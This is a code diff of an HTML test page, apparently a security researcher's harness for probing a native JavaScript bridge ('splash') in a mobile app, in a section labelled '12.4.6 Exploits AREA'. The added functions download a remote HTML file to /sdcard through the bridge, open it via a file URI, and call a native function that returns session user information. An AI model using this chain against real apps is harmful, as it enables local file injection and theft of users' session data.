@@ -140,47 +140,22 @@ startTask
     </button>
 
     -->
-    <h6>NEW TEST AREA</h6>
+    <h6>12.4.6 Exploits AREA</h6>
     <br>
-    <button onclick="getMethodsNames(wpsS2i)">
-        List wpsS2i
-
-    </button>
-    <br>
-    <button onclick="getMethodsNames(wpsVersionCmp)">
-        List wpsVersionCmp
+    <button onclick="downloadRemoteFile()">
+        DOWNLOAD REMOTE HTML FILE
 
     </button>
 
     <br>
-    <button onclick='printShit()'>
-        List ALL
+    <button onclick="openRemoteFile()">
+        OPEN REMOTE HTML FILE
+
     </button>
 
     <br>
-    <button onclick='printShit2()'>
-        List Shit2
-    </button>
-
-
-    <br>
-    <button onclick=' document.getElementById("myP").innerHTML=splash.requestSessionUserInfo'>
-        TEST
-    </button>
-
-    <br>
-    <button onclick=' document.getElementById("myP").innerHTML=splash.requestSessionUserInfo()'>
-        TEST2
-    </button>
-
-    <br>
-    <button onclick=' document.getElementById("myP").innerHTML=Object.keys(splash)'>
-        TEST3
-    </button>
-
-    <br>
-    <button onclick='change()'>
-        TEST4
+    <button onclick="requestSessUserInfo()">
+        Call requestSessUserInfo - Native Function
     </button>
 
 
@@ -246,7 +221,6 @@ startTask
 
             try {
                 splash.requestSessionUserInfo();
-                //document.getElementById("myP").innerHTML += Error().stack;
                 
             } catch (error) {
                 document.getElementById("myP").innerHTML += "ERROR HERE\n" + error;
@@ -259,13 +233,19 @@ startTask
 
         function appJs_sessionCallback(x, y) {
             try {
-                document.getElementById("myP").innerHTML += "NOPE  I AM NOW HERE@"
                 document.getElementById("myP").innerHTML += x + "\n\n" + y;
             } catch (error) {
                 document.getElementById("myP").innerHTML = error;
             }
         }
 
+        function downloadRemoteFile(){
+            splash.JSDownload("test","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/index.html")
+        }
+
+        function openRemoteFile(){
+            splash.JSJumpURI('test','file:///sdcard/Download/index.html','{}')
+        }
 
 
 
